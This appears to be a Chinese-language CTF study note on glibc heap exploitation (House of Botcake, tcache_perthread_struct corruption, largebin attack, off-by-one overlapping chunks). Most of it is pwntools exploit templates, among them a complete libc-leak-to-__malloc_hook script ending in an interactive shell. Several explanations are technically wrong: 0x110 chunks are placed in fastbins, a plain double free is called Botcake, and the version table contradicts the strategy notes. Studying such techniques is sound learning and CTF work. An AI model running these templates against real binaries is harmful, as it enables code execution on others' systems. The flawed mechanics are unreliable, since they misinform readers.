# House of Botcake & Tcache Perthread Corruption

## 原理

House of Botcake 结合了 **tcache poisoning** 和 **fastbin double-free**，利用同一大 chunk 先进入 tcache、再进入 fastbin 的特性，实现不依赖 tcache key 检测的 double-free。tcache perthread_struct corruption 则通过溢出 tcache 的 counts 数组，使 malloc 绕过 tcache 计数限制，将 chunk 放入 fastbin/unsorted bin，从而获得对 fd/bk 的完整控制。

## House of Botcake 机制

### 1. 核心思路

glibc 2.29+ 引入了 tcache key（`tcache_perthread_struct->entries` 中存储的反向指针）用于检测 double-free。但如果 chunk 在 tcache 中被取出后再次释放，key 检查的是 **第一次 free 时写入的 key**，而该 chunk 已不在 tcache 中，检查通过，chunk 进入 fastbin（或 unsorted bin），造成 **fastbin 中的 double-free**。

```
第一次 free  → tcache（写入 tcache key）
malloc 取出  → tcache 中移除，key 仍在 chunk 中
第二次 free  → key 不匹配 tcache（因为 chunk 不在 tcache），通过检查 → fastbin
```

### 2. 攻击流程

```python
from pwn import *

# === House of Botcake ===
# 适用 glibc 2.29+ (有 tcache key)
# 条件：需要能控制 free 时机

def exploit():
    # Phase 1: 构造 tcache double-free
    # 分配 7 个填满 tcache + 1 个 extra
    for i in range(7):
        malloc(0x100)      # idx 0-6
    malloc(0x100)           # idx 7 (victim)
    malloc(0x20)            # idx 8 (guard, 防止 top chunk 合并)

    # Phase 2: 释放 7 个填满 tcache
    for i in range(7):
        free(i)             # tcache[0x110] = 7/7

    # Phase 3: 释放 victim，进入 tcache
    free(7)                 # tcache[0x110] = 7/7，victim 在 tcache 末尾

    # Phase 4: 取出 victim，tcache key 被清除
    malloc(0x100)           # idx 9，取出 victim (idx 7)

    # Phase 5: 再次 free victim → key 检查通过 → 进入 fastbin
    free(7)                 # victim 现在在 fastbin 中！
    # 此时 victim 的 fd 被设置为 fastbin 链中的下一个（可能是 tcache 中的块）

    # Phase 6: 利用 UAF/漏洞修改 victim 的 fd 指针
    # （如果有 UAF，直接修改；否则通过其他漏洞）
    edit(7, p64(target_addr))  # 修改 fastbin fd

    # Phase 7: 清空 tcache
    for i in range(7):
        malloc(0x100)

    # Phase 8: 第一次 malloc 触发 fastbin → victim 返回
    malloc(0x100)           # idx 10，返回 victim

    # Phase 9: 第二次 malloc 返回 target_addr
    malloc(0x100)           # idx 11，返回 target_addr
```

### 3. 变体：Botcake + Tcache Poisoning 组合

```python
# 如果同时有 UAF 和可控 free：
# 1. 利用 Botcake 将 chunk 送入 fastbin
# 2. 利用 UAF 修改 fastbin fd
# 3. 分配得到 target_addr
# 优势：即使 tcache 有 key 检测也能绕过

# 更高效的变体（减少所需 chunk 数量）：
malloc(0x100)  # idx 0 (tcache victim)
malloc(0x100)  # idx 1 (fastbin victim)
malloc(0x20)   # idx 2 (guard)

# 填满 tcache
for i in range(7):
    malloc(0x100)  # idx 3-9
# 释放填满 tcache
for i in range(7):
    free(i + 3)    # tcache[0x110] = 7/7

# 释放 victim 到 fastbin
free(1)            # fastbin[0x110] = victim1

# Botcake: 取出 tcache 中的 victim
free(0)            # tcache: 0→victim0→... (victim0 在 tcache)

# 现在 victim1 在 fastbin, victim0 在 tcache
# 利用 UAF 修改 victim1 的 fd
edit(1, p64(target_addr))

# 清空 tcache
for i in range(7):
    malloc(0x100)

# 触发 fastbin 分配
malloc(0x100)      # 返回 victim1
malloc(0x100)      # 返回 target_addr
```

## Tcache Perthread Corruption

### 1. tcache_perthread_struct 布局

```
+0x00:  counts[64]    # 每个 bin 的计数器（uint16_t），共 128 字节
+0x80:  entries[64]   # 每个 bin 的链表头指针（void*），共 512 字节
总计: 640 字节 (0x280)
```

```c
typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];  // 64 个 uint16_t
    tcache_entry *entries[TCACHE_MAX_BINS];  // 64 个指针
} tcache_perthread_struct;
```

### 2. counts 数组溢出攻击

```python
# tcache_perthread_struct 是 heap 上的第一个 chunk
# 如果有堆溢出/overlapping chunk 漏洞，可以溢出 counts 数组

# 效果：使某个 tcache bin 的 counts > 7
# → malloc 从 tcache 分配时，不会检查 fd 是否有效
# → 可以将 chunk 送入 fastbin/unsorted bin（因为 tcache "已满"）
# → 获得对 fd/bk 的控制

# 利用步骤：
# 1. 泄露 heap 地址（找到 tcache_perthread_struct）
# 2. 溢出修改 counts[bin_index] = 8（或更大值）
# 3. 释放该 bin 的 chunk → 进入 fastbin（因为 tcache "已满"）
# 4. 修改 fastbin fd → target_addr
# 5. 分配得到 target_addr
```

```python
# 完整利用模板
# 条件：堆溢出（off-by-one, 任意写等）

# 1. 构造溢出，修改 tcache_perthread_struct
heap_base = leak_heap()  # 需要泄露
tcache = heap_base + 0x10  # tcache_perthread_struct 偏移

# 溢出 counts[bin_index]（每个 entry 2 字节）
# bin_index 对应的 size: bin_index * 0x10 + 0x20
# 例如 0x20 大小的 chunk → bin_index = 0
bin_index = (target_size - 0x20) // 0x10

# 构造 payload：写入 counts 数组区域
payload = b''
# 填充到 counts[bin_index] 的偏移
# counts 从 tcache 起始处开始，每个 2 字节
offset_to_counts = 0  # counts 在结构体最前面
offset = offset_to_counts + bin_index * 2

# 构造溢出数据
overflow_data = b'\x00' * offset
overflow_data += p16(8)  # 设置 counts[bin_index] = 8（超过限制 7）

# 写入溢出
write(offset_addr, overflow_data)

# 2. 释放 target_size 的 chunk → 进入 fastbin
malloc(target_size)  # idx 0
malloc(target_size)  # idx 1 (guard)
free(0)              # 进入 fastbin（因为 counts 已满）

# 3. 修改 fastbin fd
edit(0, p64(target_addr))

# 4. 分配得到 target_addr
malloc(target_size)  # 返回 idx 0
malloc(target_size)  # 返回 target_addr
```

### 3. entries 数组覆写

```python
# 如果能覆写 entries 指针（更强大的效果）：
# 直接控制 malloc 返回的地址

# entries[bin_index] = target_addr - 0x10
# → 下次 malloc(target_size) 直接返回 target_addr
# 无需两步分配
```

## Largebin Attack 基础

### 1. 原理

当一个 chunk 被插入 largebin 时，如果 largebin 中已有更大和更小的 chunk，glibc 会将该 chunk 插入到链表头部，并通过 `bk_nextsize` 和 `fd_nextsize` 维护双向链表。插入过程中会修改已有 chunk 的 `bk_nextsize`，如果能控制已有 chunk 的 `bk_nextsize` 指针，就能在目标地址写入堆地址。

### 2. 攻击条件

```python
# 需要：
# 1. 一个在 largebin 中的 chunk A（已有）
# 2. 能修改 chunk A 的 bk_nextsize（通过 UAF 或其他漏洞）
# 3. 释放一个与 A 同 size 的 chunk B → 触发插入

# 效果：target_addr 被写入堆地址（chunk B 的地址）
```

### 3. 利用模板

```python
# 分配布局
malloc(0x420)  # idx 0 (victim A)
malloc(0x20)   # idx 1 (guard)
malloc(0x410)  # idx 2 (victim B)
malloc(0x20)   # idx 3 (guard)

# 释放 A → unsorted bin
free(0)

# 分配更大的 chunk，触发 A 进入 largebin
malloc(0x430)  # idx 4

# 释放 B → unsorted bin
free(2)

# 修改 A 的 bk_nextsize（通过 UAF/漏洞）
# A 在 largebin 中，修改其 bk_nextsize
edit(0, p64(target_addr - 0x20) + b'\x00' * ...)
# 注意：需要精确控制偏移，bk_nextsize 在 chunk + 0x20

# 分配触发 largebin 插入
malloc(0x430)
# 此时 target_addr 被写入 chunk B 的堆地址
```

## Off-by-One Null Byte Poisoning

### 1. 原理

堆块 metadata 中 size 字段的最低位存储 **PREV_INUSE** 标志。如果能向下一个 chunk 的 size 字段写入一个 null byte（`\x00`），会清除 PREV_INUSE 标志，使 glibc 认为前一个 chunk 已被释放，触发向前合并（forward consolidation）。

### 2. 攻击流程

```python
# 条件：堆溢出恰好能写一个 null byte 到下一个 chunk 的 size

# 分配布局
malloc(0x100)  # idx 0 (victim)
malloc(0x180)  # idx 1 (target, PREV_INUSE 会被清除)
malloc(0x20)   # idx 2 (guard)

# Off-by-one：向 idx 1 的 size 写入 null byte
# 例如 idx 0 的 size = 0x111，溢出到 idx 1 的 size
# idx 1 原 size = 0x191 → 清除后 = 0x190

# 触发合并：
# 1. 修改 victim 的 prev_size = victim 的实际大小
# 2. 释放 victim → glibc 检查 idx 1 的 PREV_INUSE
# 3. PREV_INUSE = 0 → 向前合并 → 覆盖 idx 1

# 利用合并覆盖关键数据
# 例如：合并后 malloc 返回 overlap 的区域，可以修改 tcache/fastbin 链
```

### 3. 经典 Unsorted Bin Attack + Off-by-One

```python
# 利用 off-by-one 清除 PREV_INUSE + unsorted bin attack
# 实现 overlapping chunks

malloc(0x100)  # idx 0
malloc(0x200)  # idx 1
malloc(0x100)  # idx 2 (guard)

# off-by-one：清除 idx 1 的 PREV_INUSE
# 然后修改 idx 1 的 prev_size = 0x110

# 释放 idx 0 → unsorted bin
free(0)

# 分配大于 0x100 的 chunk，触发 idx 1 合并
malloc(0x300)
# idx 1 被合并，再 split → 新 chunk 包含原 idx 1 区域
```

## Heap Feng Shui 技术

### 1. 精确布局原则

```python
# 目标：在 exploit 过程中保持堆状态可控
# 1. Guard chunks：防止 top chunk 合并
# 2. 分隔符：隔开不同用途的 chunk
# 3. 控制 free 顺序：tcache/fastbin/unsorted bin 的行为不同

# 经典布局模板
def setup_heap():
    # 分配目标 chunk
    malloc(0x200)   # idx 0 (用于泄露/利用)
    malloc(0x200)   # idx 1 (guard，防止合并)
    # 分配控制 chunk
    malloc(0x40)    # idx 2 (用于 tcache poisoning)
    malloc(0x40)    # idx 3
    malloc(0x20)    # idx 4 (guard)
    # 预留 chunk
    malloc(0x100)   # idx 5 (用于 largebin attack)
    malloc(0x20)    # idx 6 (guard)
```

### 2. 填充 tcache/fastbin

```python
# 填满 tcache（7 个）
def fill_tcache(size):
    for i in range(7):
        malloc(size)

# 填满 fastbin（需要先填满 tcache，再额外释放）
def fill_fastbin(size):
    fill_tcache(size)
    # 再分配 7 个
    for i in range(7):
        malloc(size)
    # 释放这 7 个 → 进入 fastbin
    for i in range(7):
        free(7 + i)
```

### 3. 避免 chunk 合并

```python
# 方法 1：相邻 guard chunk（始终 malloc 不 free）
# 方法 2：设置 prev_inuse 位
# 方法 3：使用 non-main arena（线程 heap）
```

## Payload 模板（pwntools）

### 1. Botcake RCE 模板

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# 配置
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
p = process('./pwn')

def malloc(size, data=b''):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    if data:
        p.sendafter(b'Content: ', data)

def free(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Content: ', data)

def show(idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())

# === House of Botcake Exploit ===
# Phase 1: 泄露 libc
malloc(0x420)            # idx 0
malloc(0x20)             # idx 1 (guard)
for i in range(7):
    malloc(0x420)         # idx 2-8 (填 tcache)

for i in range(7):
    free(i + 2)           # 填满 tcache
free(0)                   # 进入 unsorted bin（tcache 已满）
# 实际上 unsorted bin，因为 size > tcache_max

show(0)
p.recvuntil(b'Data: ')
libc_base = u64(p.recv(8)) - (libc.sym['main_arena'] + 96)
log.info(f'libc_base: {hex(libc_base)}')

malloc(0x420)             # idx 9，取出 unsorted bin 中的 0

# Phase 2: Botcake 获取 target
malloc(0x70)              # idx 10 (fastbin victim)
malloc(0x70)              # idx 11 (guard)
malloc(0x20)              # idx 12 (guard)

for i in range(7):
    malloc(0x70)           # idx 13-19
for i in range(7):
    free(i + 13)           # 填满 tcache

free(10)                   # fastbin 中（tcache 满）
free(10)                   # Botcake! 取出再释放

# 如果有 UAF，修改 fd
target = libc_base + libc.sym['__malloc_hook']  # glibc < 2.34
# 或 target = libc_base + system
edit(10, p64(target))

# 清空 tcache
for i in range(7):
    malloc(0x70)

malloc(0x70)               # 返回 victim
malloc(0x70)               # 返回 target

p.interactive()
```

### 2. Tcache Corruption + Largebin Attack 模板

```python
# === Tcache Corruption + Largebin → FSOP ===
# 适用于 glibc 2.27-2.33

# Phase 1: 堆溢出修改 tcache counts
heap_base = leak_heap()
tcache_struct = heap_base + 0x10

# 溢出写入：counts[bin_index] = 8
overflow_payload = b'\x00' * bin_index * 2 + p16(8)
write_to_heap(overflow_offset, overflow_payload)

# Phase 2: 送 chunk 到 unsorted bin
malloc(0x200)
free(0)  # 进入 unsorted bin（tcache 已满）

# Phase 3: Largebin attack 写入 _IO_list_all
malloc(0x300)  # 触发 unsorted → largebin
edit(0, p64(io_list_all - 0x20))  # 修改 largebin fd_nextsize

malloc(0x300)  # 写入 _IO_list_all

# Phase 4: 伪造 IO_FILE + 触发 abort → RCE
```

### 3. Off-by-One Overlapping Chunks 模板

```python
# === Off-by-One → Overlapping Chunks ===
malloc(0x100)   # idx 0
malloc(0x180)   # idx 1 (size = 0x191)
malloc(0x100)   # idx 2 (guard)

# Off-by-one：idx 0 溢出一个 null byte
payload = b'\x00' * 0x100  # 填满 idx 0
payload += b'\x00'          # 清除 idx 1 的 PREV_INUSE
edit(0, payload)

# 修改 idx 1 的 prev_size
# prev_size = 0x110（idx 0 的实际大小）
edit(0, b'\x00' * 0x100 + p64(0x110))

# 释放 idx 0 → unsorted bin
free(0)

# 分配更大的 chunk，触发合并
malloc(0x300)
# 合并后 overlap 了原 idx 1 的区域
```

## Glibc 版本适用性

### 1. 各版本对比

| 技术 | glibc ≤ 2.25 | glibc 2.26 | glibc 2.27-2.28 | glibc 2.29-2.31 | glibc 2.32-2.33 | glibc 2.34+ |
|------|:---:|:---:|:---:|:---:|:---:|:---:|
| tcache | ✗ | ✓ | ✓ | ✓ | ✓ | ✓ |
| tcache key 检测 | ✗ | ✗ | ✗ | ✓ | ✓ | ✓ |
| safe-linking | ✗ | ✗ | ✗ | ✗ | ✓ | ✓ |
| Botcake | ✗ | ✓ | ✓ | ✓ | ✓ | ✓ |
| __malloc_hook | ✓ | ✓ | ✓ | ✓ | ✓ | ✗ |
| __free_hook | ✓ | ✓ | ✓ | ✓ | ✓ | ✗ |

### 2. 推荐利用策略

```python
# glibc ≤ 2.25: 无 tcache，直接 fastbin attack / unsorted bin attack
# glibc 2.26-2.28: Botcake 不需要（无 key），直接 tcache poisoning
# glibc 2.29-2.31: Botcake 必需，绕过 tcache key
# glibc 2.32-2.33: Botcake + safe-linking（需要泄露堆地址加密 fd）
# glibc 2.34+: Botcake + safe-linking + 无 hooks（需要 IO_FILE 利用）
```

### 3. 现代 glibc 利用链总结

```
glibc 2.34+ 利用路径：
1. Botcake 获取 arbitrary malloc
2. safe-linking 解密 fd（需要 heap 泄露）
3. 目标：IO_FILE / exit_funcs / TLS
4. 无 __malloc_hook / __free_hook → House of Apple 2/3
```

## 2024-2026 新技术点

### 1. Tcache Perthread 保护加固

```python
# glibc 2.38+: counts 类型从 uint16_t 可能变为 uint8_t
# 检查 tcache_perthread_struct 布局变化
# 新版本可能增加 additional integrity checks
# 需要根据具体 glibc 版本调整偏移
```

### 2. Safe-linking 强化

```python
# glibc 2.32+ 默认启用
# tcache/fastbin fd 加密：fd_encrypted = (heap_addr >> 12) ^ next_addr
# 泄露 heap 后才能构造有效 fd
# 2024 CTF 中常见：
# 1. 通过 UAF 泄露 tcache entries 指针
# 2. 计算 heap_base
# 3. 加密 fd = (heap_base + offset) ^ target
```

### 3. Tcache Key 增强

```python
# glibc 2.29+: key 存储在 chunk 的 fd 字段（前 8 字节）
# glibc 2.34+: 增加对 key 的额外校验
# 绕过方法：
# 1. Botcake（不依赖 key 检查）
# 2. 覆写 key 为匹配值
# 3. 利用 unsorted bin（不受 tcache key 影响）
```

### 4. 现代利用链

```python
# 2024-2026 常见利用链：
# 1. Botcake → arbitrary malloc → IO_FILE 伪造 → RCE
# 2. Tcache corruption + largebin attack → FSOP → RCE
# 3. Off-by-one → overlapping chunks → tcache poisoning → hook/got
# 4. Double free (无 key) → tcache poisoning → one_gadget

# House of 系列在 2024+ 的应用：
# - House of Botcake: 绕过 tcache key
# - House of Cat: IO_FILE + tcache (glibc 2.35+)
# - House of Apple 2/3: glibc 2.34+ 无 hooks
# - House of Kiwi: IO_FILE + setcontext
```

### 5. 防御绕过

```python
# ASLR 绕过：
# - 泄露 libc: unsorted bin fd/bk → main_arena → libc_base
# - 泄露 heap: tcache fd → heap_base
# - 泄露 stack: _environ / __libc_start_main 返回地址

# PIE 绕过：
# - 部分相对偏移在已知位置
# - 通过 GOT/PLT 泄露 base

# CFI 绕过：
# - 直接调用 system/one_gadget
# - 避免间接调用（__malloc_hook 等）
```

## 工具推荐

- **pwntools** — Python 利用框架，堆布局构造
- **gdb + pwndbg** — `heap` `bins` `tcache` 命令可视化
- **pwndbg** — `heap bins` 查看所有 bin，`heap tcache` 查看 tcache
- **how2heap** — 各种堆利用技术的完整示例
- **one_gadget** — 寻找 one-shot RCE gadget
- **patchelf** — 修改 ELF 以使用指定 libc 版本

## 参考链接

- [ctf-wiki House of Botcake](https://ctf-wiki.org/pwn/linux/glibc-heap/house-of-botcake/)
- [how2heap](https://github.com/shellphish/how2heap)
- [glibc 源码 malloc.c](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c)
- [pwndbg tcache 命令](https://github.com/pwndbg/pwndbg)
- [phrack tcache poisoning](https://www.phrack.org/papers/vm_traps.html)
